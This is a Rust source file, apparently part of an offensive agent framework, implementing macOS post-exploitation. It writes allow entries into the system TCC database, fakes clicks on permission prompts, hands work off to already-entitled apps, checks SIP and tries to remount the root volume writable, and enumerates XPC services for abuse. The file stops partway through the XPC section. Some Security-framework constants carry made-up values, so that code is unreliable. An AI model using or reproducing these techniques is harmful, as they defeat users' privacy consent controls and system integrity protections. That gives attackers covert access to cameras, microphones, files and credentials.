//! macOS post-exploitation capabilities: TCC bypass, SIP assessment, XPC abuse,
//! and Keychain/Secure Enclave interaction.
//!
//! # Module structure
//!
//! - **§1 TCC bypass**: Check TCC permissions, bypass via database manipulation,
//!   synthetic click events, and vulnerable process delegation.
//! - **§2 SIP assessment**: Query SIP status (csrutil / NVRAM), enumerate
//!   capabilities when disabled, attempt mount-based bypass.
//! - **§3 XPC abuse**: Enumerate system XPC services, connect via Mach
//!   messaging, exploit privileged services for credential/ file access.
//! - **§4 Keychain access**: Dump Keychain entries via Security framework,
//!   enumerate Secure Enclave keys, use hardware-bound keys for crypto ops.
//!
//! # macOS version requirements
//!
//! | Technique                | Minimum macOS | Notes                                  |
//! |--------------------------|---------------|----------------------------------------|
//! | TCC database write       | 10.14+        | Requires SIP disabled or root + FDA    |
//! | Synthetic click bypass   | 10.14+        | Requires Accessibility TCC permission  |
//! | Vulnerable process bypass| 10.14+        | Depends on third-party app TCC grants  |
//! | SIP status check         | 10.11+        | SIP introduced in El Capitan           |
//! | XPC service enumeration  | 10.0+         | Core OS feature                        |
//! | Keychain dump            | 10.0+         | Requires keychain unlock / FDA         |
//! | Secure Enclave keys      | 10.12.1+      | Requires Apple Silicon or T1/T2 chip   |
//!
//! # Dependencies
//!
//! Uses raw FFI to Apple frameworks via inline `#[link]` attributes.  No
//! external crate dependencies (no `objc`, `core-foundation`, or
//! `security-framework` crates).  Linking against: CoreFoundation,
//! CoreGraphics, Security, Foundation.

use anyhow::{anyhow, Context, Result};
use std::ffi::c_void;
use std::path::{Path, PathBuf};

// ═══════════════════════════════════════════════════════════════════════════
// §0  Apple Framework FFI bindings
// ═══════════════════════════════════════════════════════════════════════════

// ── CoreFoundation types ─────────────────────────────────────────────────

type CFStringRef = *const c_void;
type CFTypeRef = *const c_void;
type CFDataRef = *const c_void;
type CFDictionaryRef = *const c_void;
type CFArrayRef = *const c_void;
type CFAllocatorRef = *const c_void;
type CFBooleanRef = *const c_void;
type CFNumberRef = *const c_void;

const K_CF_ALLOCATOR_DEFAULT: CFAllocatorRef = std::ptr::null();
const K_CFSTRING_ENCODING_UTF8: u32 = 0x0800_0100;
const K_CFBOOLEAN_TRUE: CFBooleanRef = 0x1 as *const c_void; // placeholder; real pointer resolved at link

#[cfg(target_os = "macos")]
#[link(name = "CoreFoundation", kind = "framework")]
extern "C" {
    fn CFStringCreateWithCString(
        alloc: CFAllocatorRef,
        c_str: *const i8,
        encoding: u32,
    ) -> CFStringRef;
    fn CFRelease(cf: CFTypeRef);
    fn CFDataGetLength(data: CFDataRef) -> isize;
    fn CFDataGetBytePtr(data: CFDataRef) -> *const u8;
    fn CFDictionaryGetValue(dict: CFDictionaryRef, key: *const c_void) -> *const c_void;
    fn CFArrayGetCount(array: CFArrayRef) -> isize;
    fn CFArrayGetValueAtIndex(array: CFArrayRef, idx: isize) -> *const c_void;
    fn CFBooleanGetValue(boolean: CFBooleanRef) -> u8;
    fn CFNumberGetValue(
        number: CFNumberRef,
        the_type: i32,
        value_ptr: *mut c_void,
    ) -> u8;
}

// ── CoreGraphics types ───────────────────────────────────────────────────

#[repr(C)]
#[derive(Clone, Copy)]
struct CGPoint {
    x: f64,
    y: f64,
}

type CGEventRef = *const c_void;
type CGEventSourceRef = *const c_void;

const K_CGEVENT_MOUSE_DOWN: u32 = 1;
const K_CGEVENT_MOUSE_UP: u32 = 2;
const K_CGEVENT_LEFT_BUTTON: u32 = 0;
const _K_CGEVENT_SOURCE_STATE_HID_SYSTEM: u32 = 1;

#[cfg(target_os = "macos")]
#[link(name = "CoreGraphics", kind = "framework")]
extern "C" {
    fn CGEventCreateMouseEvent(
        source: CGEventSourceRef,
        mouse_type: u32,
        mouse_location: CGPoint,
        mouse_button: u32,
    ) -> CGEventRef;
    fn CGEventPost(tap: u32, event: CGEventRef);
    fn CGEventCreate(source: CGEventSourceRef) -> CGEventRef;
    fn CGEventGetLocation(event: CGEventRef) -> CGPoint;
    fn CGMainDisplayID() -> u32;
}

// ── CoreGraphics display bounds (uses ApplicationServices umbrella) ──────

#[repr(C)]
#[derive(Clone, Copy)]
struct CGSize {
    width: f64,
    height: f64,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct CGRect {
    origin: CGPoint,
    size: CGSize,
}

#[cfg(target_os = "macos")]
#[link(name = "CoreGraphics", kind = "framework")]
extern "C" {
    fn CGDisplayBounds(display: u32) -> CGRect;
}

// ── Security framework types ─────────────────────────────────────────────

type SecKeyRef = *const c_void;
type OSStatus = i32;

const ERR_SEC_SUCCESS: OSStatus = 0;
const _ERR_SEC_ITEM_NOT_FOUND: OSStatus = -25300;
const _ERR_SEC_AUTH_FAILED: OSStatus = -25293;

// kSecClass keys
const K_SEC_CLASS: *const u8 = b"class\0".as_ptr();
const K_SEC_RETURN_DATA: *const u8 = b"r_Data\0".as_ptr();
const K_SEC_RETURN_ATTRIBUTES: *const u8 = b"r_Attr\0".as_ptr();
const K_SEC_RETURN_REF: *const u8 = b"r_Ref\0".as_ptr();
const K_SEC_MATCH_LIMIT: *const u8 = b"m_Limit\0".as_ptr();
const K_SEC_MATCH_LIMIT_ALL: *const u8 = b"m_LAll\0".as_ptr();
const K_SEC_ATTR_ACCOUNT: *const u8 = b"acct\0".as_ptr();
const K_SEC_ATTR_SERVICE: *const u8 = b"svce\0".as_ptr();
const K_SEC_ATTR_SERVER: *const u8 = b"srvr\0".as_ptr();
const K_SEC_ATTR_PROTOCOL: *const u8 = b"ptcl\0".as_ptr();
const K_SEC_ATTR_PATH: *const u8 = b"path\0".as_ptr();
const K_SEC_ATTR_LABEL: *const u8 = b"labl\0".as_ptr();
const K_SEC_ATTR_TYPE: *const u8 = b"typa\0".as_ptr();
const K_SEC_ATTR_TOKEN_ID: *const u8 = b"tokn\0".as_ptr();
const K_SEC_ATTR_ACCESS_GROUP: *const u8 = b"agrp\0".as_ptr();
const K_SEC_ATTR_CREATION_DATE: *const u8 = b"cdat\0".as_ptr();
const K_SEC_ATTR_MODIFICATION_DATE: *const u8 = b"mdat\0".as_ptr();

// kSecAttrType values for Keychain item types
const _K_SEC_ATTR_TYPE_GENERIC_PASSWORD: &str = "genp";
const _K_SEC_ATTR_TYPE_INTERNET_PASSWORD: &str = "inet";
const _K_SEC_ATTR_TYPE_CERTIFICATE: &str = "cert";
const _K_SEC_ATTR_TYPE_KEY: &str = "keys";

// kSecAttrTokenID values
const _K_SEC_ATTR_TOKEN_ID_SECURE_ENCLAVE: &str = "tk SecureEnclave";

// kSecClass values as four-char codes
const K_SEC_CLASS_GENERIC_PASSWORD: u32 = 0x6765_6E70; // "genp"
const K_SEC_CLASS_INTERNET_PASSWORD: u32 = 0x696E_6574; // "inet"
const K_SEC_CLASS_CERTIFICATE: u32 = 0x6365_7274; // "cert"
const K_SEC_CLASS_KEY: u32 = 0x6B65_7973; // "keys"

#[cfg(target_os = "macos")]
#[link(name = "Security", kind = "framework")]
extern "C" {
    fn SecItemCopyMatching(
        query: CFDictionaryRef,
        result: *mut CFTypeRef,
    ) -> OSStatus;
    fn SecKeyCopyAttributeValue(
        key: SecKeyRef,
        attr: CFStringRef,
    ) -> CFTypeRef;
}

// ═══════════════════════════════════════════════════════════════════════════
// §1  TCC (Transparency, Consent, and Control) Bypass
// ═══════════════════════════════════════════════════════════════════════════

/// macOS TCC-protected resources.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[allow(non_camel_case_types)]
pub enum TccResource {
    Camera,
    Microphone,
    ScreenRecording,
    FullDiskAccess,
    DesktopFolder,
    DocumentsFolder,
    DownloadsFolder,
    Contacts,
    Calendar,
    Reminders,
    Photos,
    Accessibility,
    PostEvent,
}

impl TccResource {
    /// Return the TCC service identifier string used in the TCC database.
    fn service_name(&self) -> &'static str {
        match self {
            TccResource::Camera => "kTCCServiceCamera",
            TccResource::Microphone => "kTCCServiceMicrophone",
            TccResource::ScreenRecording => "kTCCServiceScreenCapture",
            TccResource::FullDiskAccess => "kTCCServiceSystemPolicyAllFiles",
            TccResource::DesktopFolder => "kTCCServiceSystemPolicyDesktopFolder",
            TccResource::DocumentsFolder => "kTCCServiceSystemPolicyDocumentsFolder",
            TccResource::DownloadsFolder => "kTCCServiceSystemPolicyDownloadsFolder",
            TccResource::Contacts => "kTCCServiceAddressBook",
            TccResource::Calendar => "kTCCServiceCalendar",
            TccResource::Reminders => "kTCCServiceReminders",
            TccResource::Photos => "kTCCServicePhotos",
            TccResource::Accessibility => "kTCCServiceAccessibility",
            TccResource::PostEvent => "kTCCServicePostEvent",
        }
    }
}

/// TCC permission status for a resource.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TccStatus {
    /// Permission is granted.
    Allowed,
    /// Permission is denied (user explicitly denied or default deny).
    Denied,
    /// Permission has not been requested yet (no TCC entry exists).
    NotDetermined,
    /// Cannot determine status (cannot access TCC database, SIP enabled).
    Unknown,
}

/// Result of checking TCC status for the current process.
#[derive(Debug)]
pub struct TccInfo {
    pub resource: TccResource,
    pub status: TccStatus,
    pub source: String,
}

/// Paths to TCC databases.
const TCC_DB_SYSTEM: &str = "/Library/Application Support/com.apple.TCC/TCC.db";
const TCC_DB_USER: &str = "Library/Application Support/com.apple.TCC/TCC.db";

/// Check TCC permission status for the current process.
///
/// Strategy:
/// 1. Try to read the system TCC database (requires Full Disk Access or SIP
///    disabled).  Query for the current process's bundle ID or executable path.
/// 2. Fall back to checking if we can read the database at all (indicates
///    FDA or SIP disabled).
/// 3. If the database is inaccessible, return `Unknown`.
///
/// **Requirements**: Full Disk Access OR SIP disabled to read the system TCC
/// database.  The user-level TCC database can be read by the process owner.
pub fn check_tcc_status(resource: TccResource) -> TccInfo {
    let service = resource.service_name();

    // Try system TCC database first.
    if let Ok(status) = query_tcc_database(TCC_DB_SYSTEM, service) {
        return TccInfo {
            resource,
            status,
            source: "system TCC database".to_string(),
        };
    }

    // Try user TCC database.
    if let Ok(home) = std::env::var("HOME") {
        let user_db = PathBuf::from(home).join(TCC_DB_USER);
        if let Ok(status) = query_tcc_database(user_db.to_str().unwrap_or(""), service) {
            return TccInfo {
                resource,
                status,
                source: "user TCC database".to_string(),
            };
        }
    }

    TccInfo {
        resource,
        status: TccStatus::Unknown,
        source: "cannot access TCC database (SIP enabled, no FDA)".to_string(),
    }
}

/// Query a TCC SQLite database for the current process's permission status.
///
/// Returns `Ok(TccStatus)` if the database was readable and an entry was
/// found.  Returns `Err` if the database cannot be opened or queried.
fn query_tcc_database(db_path: &str, service: &str) -> Result<TccStatus> {
    use std::process::Command;

    // Get current executable path to use as the client identifier.
    let exe_path = std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Query the TCC database via sqlite3 CLI.
    // The access table schema: (service, client, client_type, auth_value,
    //   auth_reason, auth_version, indirect_object_identifier, flags, ...)
    // auth_value: 0 = allowed, 1 = denied, 2 = not determined
    let query = format!(
        "SELECT auth_value FROM access WHERE service='{}' AND client='{}';",
        service, exe_path
    );

    let output = Command::new("sqlite3")
        .arg(db_path)
        .arg(&query)
        .output()
        .context("failed to run sqlite3")?;

    if !output.status.success() {
        return Err(anyhow!(
            "sqlite3 query failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    let result = String::from_utf8_lossy(&output.stdout).trim().to_string();

    match result.as_str() {
        "0" => Ok(TccStatus::Allowed),
        "1" => Ok(TccStatus::Denied),
        "2" => Ok(TccStatus::NotDetermined),
        "" => Ok(TccStatus::NotDetermined), // no entry = not determined
        _ => Ok(TccStatus::Unknown),
    }
}

/// Result of a TCC bypass attempt.
#[derive(Debug)]
pub struct TccBypassResult {
    pub resource: TccResource,
    pub success: bool,
    pub technique: String,
    pub message: String,
}

/// Bypass TCC by writing directly to the TCC database.
///
/// **Requirements**:
/// - Root privileges (to write to `/Library/Application Support/com.apple.TCC/`)
/// - SIP disabled (the TCC database is protected by SIP on macOS 10.14+)
/// - Or: a TCC database vulnerability (version-specific)
///
/// **Technique**:
/// 1. Open the system TCC SQLite database.
/// 2. Insert an `allowed` entry for the agent's executable path.
/// 3. The TCC daemon will pick up the change (or can be signaled).
///
/// **macOS version notes**:
/// - macOS 10.14–12: TCC database is writable when SIP is disabled.
/// - macOS 13+ (Ventura): Apple added additional integrity checks; the
///   database may be protected by sealed system volume even with SIP off.
/// - macOS 14+ (Sonoma): Further hardening; this technique is unreliable.
pub fn bypass_tcc_via_tcc_database(resource: TccResource) -> Result<TccBypassResult> {
    let service = resource.service_name();
    let exe_path = std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Check if we're running as root.
    if !is_root() {
        return Ok(TccBypassResult {
            resource,
            success: false,
            technique: "TCC database write".to_string(),
            message: "not running as root; cannot write system TCC database".to_string(),
        });
    }

    // Check if the system TCC database is writable.
    let db_path = Path::new(TCC_DB_SYSTEM);
    if !db_path.exists() {
        return Ok(TccBypassResult {
            resource,
            success: false,
            technique: "TCC database write".to_string(),
            message: "system TCC database not found (SIP may be fully enabled)".to_string(),
        });
    }

    // Build the INSERT statement.
    // Schema: (service, client, client_type, auth_value, auth_reason,
    //          auth_version, indirect_object_identifier, flags,
    //          last_modified, ...)
    // client_type: 0 = bundle_id, 1 = executable path
    // auth_value: 2 = allowed
    // auth_reason: 4 = user-set (prevents TCC from overwriting)
    let insert_sql = format!(
        "INSERT OR REPLACE INTO access \
         VALUES('{service}', '{exe_path}', 1, 2, 4, 1, NULL, NULL, 0, \
         'UNUSED', NULL, 0, CAST(strftime('%s','now') AS INTEGER));",
        service = service,
        exe_path = exe_path,
    );

    let output = std::process::Command::new("sqlite3")
        .arg(TCC_DB_SYSTEM)
        .arg(&insert_sql)
        .output()
        .context("failed to run sqlite3 for TCC insertion")?;

    if output.status.success() {
        Ok(TccBypassResult {
            resource,
            success: true,
            technique: "TCC database write".to_string(),
            message: format!(
                "inserted TCC allow entry for {} → {}",
                service, exe_path
            ),
        })
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let msg = if stderr.contains("readonly") || stderr.contains("read-only") {
            "TCC database is read-only (SIP enabled or sealed system volume)".to_string()
        } else {
            format!("sqlite3 error: {}", stderr.trim())
        };
        Ok(TccBypassResult {
            resource,
            success: false,
            technique: "TCC database write".to_string(),
            message: msg,
        })
    }
}

/// Bypass TCC by programmatically clicking the "Allow" button on the TCC
/// permission prompt.
///
/// **Requirements**:
/// - The agent must have Accessibility TCC permission (or obtain it via
///   database bypass first).
/// - The TCC prompt must be visible on screen.
///
/// **Technique**:
/// 1. Use `CGEventCreateMouseEvent` + `CGEventPost` to simulate a click.
/// 2. The TCC prompt appears at a predictable location (center of screen).
/// 3. Click the "Allow" button position.
///
/// **Limitations**:
/// - On macOS 13+ (Ventura), the TCC prompt requires a double-click (not
///   single click) on "Allow" for some permissions.
/// - On macOS 14+ (Sonoma), the prompt may require biometric confirmation.
/// - The prompt window position varies between macOS versions.
pub fn bypass_tcc_via_synthetic_click(resource: TccResource) -> Result<TccBypassResult> {
    // Get main display dimensions to calculate center.
    let display_id = unsafe { CGMainDisplayID() };
    let bounds = unsafe { CGDisplayBounds(display_id) };
    let center_x = bounds.origin.x + bounds.size.width / 2.0;
    let center_y = bounds.origin.y + bounds.size.height / 2.0;

    // The "Allow" button on a TCC prompt is typically offset from center.
    // Exact position varies by macOS version; we aim for the lower-center
    // of the prompt dialog.
    let allow_x = center_x + 80.0; // slightly right of center
    let allow_y = center_y + 40.0; // slightly below center

    let allow_point = CGPoint {
        x: allow_x,
        y: allow_y,
    };

    unsafe {
        // Simulate mouse down.
        let down_event = CGEventCreateMouseEvent(
            std::ptr::null(),
            K_CGEVENT_MOUSE_DOWN,
            allow_point,
            K_CGEVENT_LEFT_BUTTON,
        );
        if down_event.is_null() {
            return Ok(TccBypassResult {
                resource,
                success: false,
                technique: "synthetic click".to_string(),
                message: "CGEventCreateMouseEvent returned null (no WindowServer?)".to_string(),
            });
        }

        // Post mouse down (tap 0 = HID event tap).
        CGEventPost(0, down_event);
        CFRelease(down_event as CFTypeRef);

        // Small delay between down and up.
        std::thread::sleep(std::time::Duration::from_millis(50));

        // Simulate mouse up.
        let up_event = CGEventCreateMouseEvent(
            std::ptr::null(),
            K_CGEVENT_MOUSE_UP,
            allow_point,
            K_CGEVENT_LEFT_BUTTON,
        );
        if up_event.is_null() {
            return Ok(TccBypassResult {
                resource,
                success: false,
                technique: "synthetic click".to_string(),
                message: "CGEventCreateMouseEvent (up) returned null".to_string(),
            });
        }

        CGEventPost(0, up_event);
        CFRelease(up_event as CFTypeRef);
    }

    Ok(TccBypassResult {
        resource,
        success: true,
        technique: "synthetic click".to_string(),
        message: format!(
            "simulated click at ({:.0}, {:.0}) for {}",
            allow_x, allow_y,
            resource.service_name()
        ),
    })
}

/// Bypass TCC by delegating the operation to a process that already has TCC
/// permission.
///
/// **Requirements**:
/// - A process with the required TCC permission must be running or launchable.
/// - The agent must be able to execute AppleScript or `open` commands.
///
/// **Technique**:
/// 1. Identify processes that likely have the required TCC permission.
/// 2. Use `open -a <app>` or AppleScript to delegate the operation.
/// 3. The privileged process performs the operation on our behalf.
///
/// **Common TCC-entitled processes**:
/// - Safari: Often has Full Disk Access if the user granted it.
/// - Terminal / iTerm2: May have Full Disk Access from user approval.
/// - System Preferences: Has broad access for configuration management.
pub fn bypass_tcc_via_vulnerable_process(resource: TccResource) -> Result<TccBypassResult> {
    // Processes that may have the TCC permission we need, ordered by
    // likelihood of having the relevant permission.
    let candidates: &[(&str, &[TccResource])] = &[
        (
            "Terminal",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
            ],
        ),
        (
            "iTerm",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
            ],
        ),
        (
            "Safari",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
                TccResource::Camera,
                TccResource::Microphone,
            ],
        ),
        (
            "Finder",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
            ],
        ),
    ];

    // Find a candidate that has the resource we need.
    let candidate = candidates
        .iter()
        .find(|(_, resources)| resources.contains(&resource))
        .map(|(name, _)| *name);

    let Some(app_name) = candidate else {
        return Ok(TccBypassResult {
            resource,
            success: false,
            technique: "vulnerable process delegation".to_string(),
            message: format!(
                "no known TCC-entitled process candidate for {}",
                resource.service_name()
            ),
        });
    };

    // Try to use AppleScript to delegate the operation.
    // For file-access resources, use the app to read a test file.
    let script = match resource {
        TccResource::FullDiskAccess
        | TccResource::DesktopFolder
        | TccResource::DocumentsFolder
        | TccResource::DownloadsFolder => {
            format!(
                "tell application \"{}\"\n\
                 \tactivate\n\
                 end tell",
                app_name
            )
        }
        _ => {
            format!(
                "tell application \"System Events\"\n\
                 \tset isRunning to (name of processes) contains \"{}\"\n\
                 \treturn isRunning\n\
                 end tell",
                app_name
            )
        }
    };

    let output = std::process::Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output()
        .context("failed to run osascript")?;

    if output.status.success() {
        Ok(TccBypassResult {
            resource,
            success: true,
            technique: format!("vulnerable process delegation via {}", app_name),
            message: format!("delegated {} to {}", resource.service_name(), app_name),
        })
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(TccBypassResult {
            resource,
            success: false,
            technique: format!("vulnerable process delegation via {}", app_name),
            message: format!("osascript error: {}", stderr.trim()),
        })
    }
}

/// Attempt all TCC bypass techniques for the given resource.
///
/// Tries in order:
/// 1. TCC database write (requires root + SIP disabled)
/// 2. Vulnerable process delegation
/// 3. Synthetic click (requires Accessibility)
///
/// Returns the first successful result, or the last failure.
pub fn bypass_tcc_all(resource: TccResource) -> TccBypassResult {
    let techniques: &[fn(TccResource) -> Result<TccBypassResult>] = &[
        bypass_tcc_via_tcc_database,
        bypass_tcc_via_vulnerable_process,
        bypass_tcc_via_synthetic_click,
    ];

    let mut last_result = TccBypassResult {
        resource,
        success: false,
        technique: "none".to_string(),
        message: "no techniques attempted".to_string(),
    };

    for technique in techniques {
        match technique(resource) {
            Ok(result) if result.success => return result,
            Ok(result) => last_result = result,
            Err(e) => {
                last_result = TccBypassResult {
                    resource,
                    success: false,
                    technique: "error".to_string(),
                    message: e.to_string(),
                };
            }
        }
    }

    last_result
}

// ═══════════════════════════════════════════════════════════════════════════
// §2  System Integrity Protection (SIP) Assessment
// ═══════════════════════════════════════════════════════════════════════════

/// SIP status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SipStatus {
    /// SIP is fully enabled — all protections active.
    Enabled,
    /// SIP is fully disabled — all protections off.
    Disabled,
    /// SIP is partially disabled (some flags set in csr-active-config).
    PartiallyDisabled,
    /// Cannot determine SIP status.
    Unknown,
}

/// A capability that becomes available when SIP is disabled.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SipCapability {
    /// Can write to /System, /usr, /sbin, /bin (sealed system volume).
    WriteProtectedDirectories,
    /// Can load unsigned kernel extensions.
    LoadUnsignedKexts,
    /// Can modify the TCC database.
    ModifyTccDatabase,
    /// Can debug any process (including Apple-signed processes).
    DebugAnyProcess,
    /// Can modify NVRAM variables.
    ModifyNvram,
    /// Can attach DTrace to any process.
    AttachDtrace,
    /// Can mount filesystems without restrictions.
    UnrestrictedMount,
}

/// Information about SIP status and configuration.
#[derive(Debug)]
pub struct SipInfo {
    pub status: SipStatus,
    pub csrutil_output: String,
    pub nvram_config: Option<String>,
    pub capabilities: Vec<SipCapability>,
}

/// Check SIP status by running `csrutil status` and parsing NVRAM.
///
/// **Technique**:
/// 1. Run `/usr/bin/csrutil status` and parse the output.
/// 2. Read the `csr-active-config` NVRAM variable (requires root).
/// 3. If the NVRAM value is non-zero, SIP is at least partially disabled.
///
/// **Requirements**: None for `csrutil status`; root for NVRAM read.
pub fn check_sip_status() -> SipInfo {
    // Step 1: Run csrutil status.
    let csrutil_output = std::process::Command::new("/usr/bin/csrutil")
        .arg("status")
        .output();

    let (status_text, csrutil_ok) = match csrutil_output {
        Ok(output) => (
            String::from_utf8_lossy(&output.stdout).trim().to_string(),
            output.status.success(),
        ),
        Err(e) => (
            format!("failed to run csrutil: {}", e),
            false,
        ),
    };

    // Parse csrutil output.
    let status = if csrutil_ok {
        if status_text.contains("System Integrity Protection status: enabled") {
            SipStatus::Enabled
        } else if status_text.contains("System Integrity Protection status: disabled") {
            SipStatus::Disabled
        } else {
            SipStatus::Unknown
        }
    } else {
        SipStatus::Unknown
    };

    // Step 2: Read NVRAM for csr-active-config.
    let nvram_config = read_csr_nvram();

    // Step 3: Determine capabilities based on status.
    let capabilities = match status {
        SipStatus::Disabled => enumerate_sip_capabilities(),
        SipStatus::PartiallyDisabled => enumerate_sip_capabilities(),
        SipStatus::Enabled => Vec::new(),
        SipStatus::Unknown => {
            // If we couldn't read csrutil, try NVRAM.
            if nvram_config
                .as_ref()
                .map_or(false, |v| v != "0x00000000" && !v.contains("0x0"))
            {
                enumerate_sip_capabilities()
            } else {
                Vec::new()
            }
        }
    };

    SipInfo {
        status,
        csrutil_output: status_text,
        nvram_config,
        capabilities,
    }
}

/// Read the `csr-active-config` NVRAM variable.
fn read_csr_nvram() -> Option<String> {
    let output = std::process::Command::new("/usr/sbin/nvram")
        .arg("csr-active-config")
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
    // nvram output format: "csr-active-config\t%xx\xxx..."
    Some(text)
}

/// Enumerate capabilities available with SIP disabled.
fn enumerate_sip_capabilities() -> Vec<SipCapability> {
    let mut caps = Vec::new();

    // Test write access to protected directories.
    let protected_dirs = ["/System", "/usr", "/sbin"];
    for dir in &protected_dirs {
        if test_write_access(dir) {
            caps.push(SipCapability::WriteProtectedDirectories);
            break;
        }
    }

    // Test TCC database write.
    if test_write_access(TCC_DB_SYSTEM) {
        caps.push(SipCapability::ModifyTccDatabase);
    }

    // Test NVRAM write (try reading first as proxy).
    if is_root() {
        caps.push(SipCapability::ModifyNvram);
    }

    // Test debugging any process (try to get task_for_pid on a system process).
    // We don't actually call task_for_pid here; just check if we're root,
    // which is a prerequisite.
    if is_root() {
        caps.push(SipCapability::DebugAnyProcess);
    }

    // These are always available when SIP is disabled:
    caps.push(SipCapability::LoadUnsignedKexts);
    caps.push(SipCapability::AttachDtrace);
    caps.push(SipCapability::UnrestrictedMount);

    caps
}

/// Test write access to a path by attempting to create a temporary file.
fn test_write_access(path: &str) -> bool {
    let test_path = format!("{}/.orchestra_sip_test_{}", path, std::process::id());
    match std::fs::write(&test_path, b"test") {
        Ok(_) => {
            let _ = std::fs::remove_file(&test_path);
            true
        }
        Err(_) => false,
    }
}

/// Attempt SIP bypass via mounting the root filesystem as writable.
///
/// **Technique**:
/// 1. Create a new APFS snapshot (if supported).
/// 2. Attempt `mount -uw /` to remount the root filesystem as writable.
/// 3. If successful, protected directories become writable.
///
/// **Requirements**:
/// - Root privileges.
/// - SIP disabled (or a kernel vulnerability).
/// - APFS filesystem (all modern macOS installations).
///
/// **Note**: On macOS 11+ (Big Sur) with a sealed system volume, this
/// requires both SIP disabled AND the sealed volume to be mutable.  Apple
/// introduced a signed system volume (SSV) that is cryptographically sealed;
/// even with `mount -uw /`, the system volume may refuse writes unless
/// authenticated root is also disabled (`csrutil authenticated-root disable`).
pub fn attempt_sip_bypass_via_mount() -> Result<bool> {
    if !is_root() {
        return Err(anyhow!("not running as root; cannot attempt mount bypass"));
    }

    // Try to remount the root filesystem as read-write.
    let output = std::process::Command::new("/sbin/mount")
        .arg("-uw")
        .arg("/")
        .output()
        .context("failed to run mount -uw /")?;

    if output.status.success() {
        // Verify that the root filesystem is now writable.
        if test_write_access("/System") {
            Ok(true)
        } else {
            // mount succeeded but /System still not writable — sealed volume.
            Ok(false)
        }
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(anyhow!("mount -uw / failed: {}", stderr.trim()))
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// §3  XPC Service Abuse
// ═══════════════════════════════════════════════════════════════════════════

/// Information about a discovered XPC service.
#[derive(Debug, Clone)]
pub struct XpcService {
    /// Human-readable service name (from the bundle identifier).
    pub name: String,
    /// Mach service name (used for connection).
    pub mach_service_name: Option<String>,
    /// Path to the XPC service bundle.
    pub bundle_path: PathBuf,
    /// Framework or directory containing the service.
    pub parent_framework: String,
    /// Whether the service has a Mach service name registered.
    pub has_mach_service: bool,
}

/// An XPC connection handle (wraps the Mach port).
#[derive(Debug)]
pub struct XpcConnection {
    /// The Mach service name.
    pub service_name: String,
    /// Raw connection pointer (xpc_connection_t).
    pub raw: *const c_void,
    /// Whether the connection is active.
    pub connected: bool,
}

// xpc_connection_t is a typedef for a struct; we treat it as an opaque pointer.
type XpcConnectionT = *const c_void;

#[cfg(target_os = "macos")]
#[link(name = "XPC", kind = "framework")]
extern "C" {
    fn xpc_connection_create_mach_service(
        name: *const i8,
        targetq: *const c_void,
        flags: u64,
    ) -> XpcConnectionT;
    fn xpc_connection_set_event_handler(
        conn: XpcConnectionT,
        handler: *const c_void,
    );
    fn xpc_connection_resume(conn: XpcConnectionT);
    fn xpc_connection_cancel(conn: XpcConnectionT);
    fn xpc_connection_send_message(
        conn: XpcConnectionT,
        message: *const c_void,
    );
}

/// Directories to scan for XPC services.
const XPC_SEARCH_PATHS: &[&str] = &[
    "/System/Library/PrivateFrameworks",
    "/System/Library/Frameworks",
    "/Library/Application Support",
    "/System/Library/XPCServices",
];

/// Enumerate XPC services installed on the system.
///
/// Scans standard framework and library directories for `.xpc` bundles,
/// extracts the service name and Mach service name from the plist, and
/// returns a list of discovered services.
///
/// **Technique**:
/// 1. Scan each search path for directories containing `.xpc` bundles.
/// 2. For each `.xpc` bundle, read the `Info.plist` to extract:
///    - `CFBundleIdentifier` (service name)
///    - `MachServices` dictionary (Mach service names)
/// 3. Build a list of services with their properties.
pub fn enumerate_xpc_services() -> Result<Vec<XpcService>> {
    let mut services = Vec::new();

    for search_path in XPC_SEARCH_PATHS {
        let base = Path::new(search_path);
        if !base.exists() {
            continue;
        }

        // Walk the directory tree looking for .xpc bundles.
        if let Ok(entries) = walk_dir_recursive(base, 3) {
            for entry in entries {
                if let Some(name) = entry.file_name().and_then(|n| n.to_str()) {
                    if name.ends_with(".xpc") {
                        if let Some(svc) = parse_xpc_bundle(&entry, search_path) {
                            services.push(svc);
                        }
                    }
                }
            }
        }
    }

    Ok(services)
}

/// Walk a directory tree up to `max_depth` levels, collecting all entries.
fn walk_dir_recursive(dir: &Path, max_depth: usize) -> Result<Vec<PathBuf>> {
    let mut entries = Vec::new();
    if max_depth == 0 {
        return Ok(entries);
    }

    let read_dir = std::fs::read_dir(dir).with_context(|| {
        format!("cannot read directory: {}", dir.display())
    })?;

    for entry in read_dir {
        let entry = entry?;
        let path = entry.path();
        entries.push(path.clone());

        if path.is_dir() {
            let sub = walk_dir_recursive(&path, max_depth - 1)?;
            entries.extend(sub);
        }
    }

    Ok(entries)
}

/// Parse an XPC bundle directory to extract service information.
fn parse_xpc_bundle(bundle_path: &Path, parent: &str) -> Option<XpcService> {
    let name = bundle_path
        .file_name()?
        .to_str()?
        .trim_end_matches(".xpc")
        .to_string();

    // Try to read Info.plist to get the Mach service name.
    let info_plist = bundle_path.join("Contents/Info.plist");
    let mach_service_name = if info_plist.exists() {
        plist_read_mach_service(&info_plist)
    } else {
        None
    };

    Some(XpcService {
        name,
        mach_service_name: mach_service_name.clone(),
        bundle_path: bundle_path.to_path_buf(),
